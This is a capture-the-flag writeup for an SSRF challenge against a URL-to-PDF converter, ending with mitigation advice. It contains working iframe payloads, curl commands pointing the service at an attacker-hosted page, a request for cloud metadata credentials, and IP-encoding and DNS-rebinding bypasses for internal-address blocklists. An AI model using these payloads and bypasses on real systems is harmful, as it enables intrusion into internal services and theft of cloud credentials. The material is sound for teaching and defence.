# CloudDoc Converter - Solution Writeup

## Challenge Information
- **Name:** CloudDoc Converter
- **Category:** Web
- **Difficulty:** Medium
- **Author:** ab_fatir

## Overview
CloudDoc Converter is a web-based PDF generation service that converts URLs to PDF documents. The challenge involves exploiting a Server-Side Request Forgery (SSRF) vulnerability to access internal services and retrieve the flag.

## Reconnaissance

### Initial Analysis
The application provides a simple interface to convert web pages to PDF. Key observations:

1. The service accepts arbitrary URLs for conversion
2. A security filter blocks common internal addresses (localhost, 127.0.0.1, 169.254.169.254)
3. The application hints at multiple backend microservices
4. PDF generation likely uses a server-side rendering engine

### Service Discovery
Testing the application reveals:
- Main endpoint: `POST /convert` with JSON body `{"url": "..."}`
- Health check available at `/health`
- Error messages suggest internal networking

## Vulnerability Analysis

### SSRF Vector
The PDF converter must fetch the provided URL to render it. This creates an SSRF vulnerability if:
1. The application doesn't properly validate the URL
2. The PDF rendering engine fetches embedded resources (images, iframes, etc.)

### Filter Analysis
The security filter performs basic string matching:
```python
blocked = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254', '::1']
```

This blacklist approach has several bypasses:
- Alternative IP representations
- DNS-based bypasses
- Subdomain tricks
- HTML content injection

## Exploitation

### Step 1: Identifying the Bypass
The filter only checks the initial URL, not the HTML content. We can:
1. Host malicious HTML on an external server
2. Embed internal URLs within the HTML
3. The PDF renderer will fetch these embedded resources

### Step 2: Setting Up Attack Infrastructure
Create a malicious HTML file (`exploit.html`):
```html
<!DOCTYPE html>
<html>
<body>
<h1>Reconnaissance</h1>
<iframe src="http://internal-storage:8080/" width="800" height="600"></iframe>
</body>
</html>
```

Host it on your server:
```bash
python3 -m http.server 8000
```

### Step 3: Initial SSRF
Submit your hosted URL to the converter:
```bash
curl -X POST http://challenge-url:3000/convert \
  -H "Content-Type: application/json" \
  -d '{"url": "http://YOUR_SERVER:8000/exploit.html"}' \
  --output recon.pdf
```

Note: Replace YOUR_SERVER with your accessible server address (e.g., ngrok URL, VPS IP, etc.)

This reveals the internal-storage service exists and responds.

### Step 4: Cloud Metadata Exploration
The metadata service hint in the filter suggests AWS IMDS. Create a new exploit to access it.

Since `169.254.169.254` is blocked, we need to bypass it. The service runs at `172.25.0.254` in the Docker network but simulates AWS IMDS structure.

Create `metadata.html`:
```html
<!DOCTYPE html>
<html>
<body>
<iframe src="http://metadata-service:80/latest/meta-data/iam/security-credentials/clouddoc-service-role" width="800" height="600"></iframe>
</body>
</html>
```

Submit it:
```bash
curl -X POST http://challenge-url:3000/convert \
  -H "Content-Type: application/json" \
  -d '{"url": "http://YOUR_SERVER:8000/metadata.html"}' \
  --output metadata.pdf
```

The PDF reveals credentials and an "InternalNote" pointing to the flag location.

### Step 5: Retrieving the Flag
The metadata response indicates: `internal-storage:8080/internal/admin/flag.txt`

Create final exploit (`flag.html`):
```html
<!DOCTYPE html>
<html>
<body>
<h1>Flag Retrieval</h1>
<iframe src="http://internal-storage:8080/internal/admin/flag.txt" width="800" height="600"></iframe>
</body>
</html>
```

Submit it:
```bash
curl -X POST http://challenge-url:3000/convert \
  -H "Content-Type: application/json" \
  -d '{"url": "http://YOUR_SERVER:8000/flag.html"}' \
  --output flag.pdf
```

Open `flag.pdf` to retrieve the flag.

## Alternative Approaches

### IP Obfuscation Bypass
If Docker DNS names were blocked, you could bypass using:
- Decimal IP: `2130706433` (127.0.0.1)
- Hex IP: `0x7f000001` (127.0.0.1)
- Short form: `127.1`
- Octal: `0177.0.0.1`

For the metadata service at 169.254.169.254:
- Decimal: `2852039166`
- Hex: `0xA9FEA9FE`

### DNS Rebinding
Set up a domain that initially resolves to your IP, then changes to resolve to internal IPs after the security check.

### URL Shorteners / Redirects
Use URL shortening services or open redirects to bypass initial URL validation.

## Flag
The flag is dynamically set during deployment and can be found at `/internal/admin/flag.txt` on the internal storage service.

## Mitigation

### Proper Defenses
1. **Use Allowlists:** Only permit specific, whitelisted domains
2. **Network Segmentation:** Run PDF generators in isolated networks with no access to internal services
3. **IP Range Validation:** Parse URLs and validate against private IP ranges (RFC1918, link-local)
4. **Disable URL Fetching:** Render only the initially provided HTML without fetching embedded resources
5. **IMDSv2:** Use AWS IMDSv2 which requires session tokens
6. **Defense in Depth:** Implement multiple layers of validation

### Code Example
```python
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        return not (ip.is_private or ip.is_loopback or ip.is_link_local)
    except:
        # Handle hostnames with DNS resolution
        resolved_ip = socket.gethostbyname(parsed.hostname)
        ip = ipaddress.ip_address(resolved_ip)
        return not (ip.is_private or ip.is_loopback or ip.is_link_local)
```

## Learning Outcomes
- Understanding SSRF attack vectors in PDF/document generation services
- Recognizing limitations of blacklist-based security filters
- Exploiting server-side rendering to access internal resources
- Understanding cloud metadata services and their security implications
- Importance of proper input validation and network segmentation

## References
- OWASP SSRF Guide: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- AWS IMDS Documentation
- PortSwigger SSRF Lab
- Real-world SSRF vulnerabilities (Capital One breach, etc.)

---
Challenge by ab_fatir for CHC CTF
